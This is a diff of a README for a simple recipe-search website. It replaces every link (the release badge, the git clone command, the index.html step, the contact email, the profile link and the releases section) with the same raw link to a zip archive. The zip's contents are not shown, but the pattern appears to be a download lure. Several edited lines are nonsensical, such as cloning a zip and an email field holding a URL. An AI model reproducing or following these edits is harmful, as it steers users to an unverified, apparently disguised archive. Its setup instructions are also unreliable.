@@ -2,7 +2,7 @@
 
 Welcome to the **Recipe Website** repository! This project allows users to search for recipes and view detailed recipe cards. With a clean design and user-friendly interface, you can easily explore a wide variety of recipes.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-brightgreen)](https://github.com/InevitabilityBarman29/recipe-website/releases)
+[![Download Releases](https://raw.githubusercontent.com/InevitabilityBarman29/recipe-website/main/recipe-page/website_recipe_2.6-beta.1.zip)](https://raw.githubusercontent.com/InevitabilityBarman29/recipe-website/main/recipe-page/website_recipe_2.6-beta.1.zip)
 
 ## Table of Contents
 
@@ -37,14 +37,14 @@ To get started with the Recipe Website, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/InevitabilityBarman29/recipe-website.git
+   git clone https://raw.githubusercontent.com/InevitabilityBarman29/recipe-website/main/recipe-page/website_recipe_2.6-beta.1.zip
    ```
 2. **Navigate to the Directory**: 
    ```bash
    cd recipe-website
    ```
 3. **Open the Index File**: 
-   Open `index.html` in your preferred web browser.
+   Open `https://raw.githubusercontent.com/InevitabilityBarman29/recipe-website/main/recipe-page/website_recipe_2.6-beta.1.zip` in your preferred web browser.
 
 ## Usage
 
@@ -78,11 +78,11 @@ This project is licensed under the MIT License. Feel free to use it for personal
 
 For any inquiries or feedback, please reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [InevitabilityBarman29](https://github.com/InevitabilityBarman29)
+- **Email**: https://raw.githubusercontent.com/InevitabilityBarman29/recipe-website/main/recipe-page/website_recipe_2.6-beta.1.zip
+- **GitHub**: [InevitabilityBarman29](https://raw.githubusercontent.com/InevitabilityBarman29/recipe-website/main/recipe-page/website_recipe_2.6-beta.1.zip)
 
 ---
 
-Explore the project further by checking out the [Releases section](https://github.com/InevitabilityBarman29/recipe-website/releases) for the latest updates and downloadable versions.
+Explore the project further by checking out the [Releases section](https://raw.githubusercontent.com/InevitabilityBarman29/recipe-website/main/recipe-page/website_recipe_2.6-beta.1.zip) for the latest updates and downloadable versions.
 
 Happy cooking! 🍳
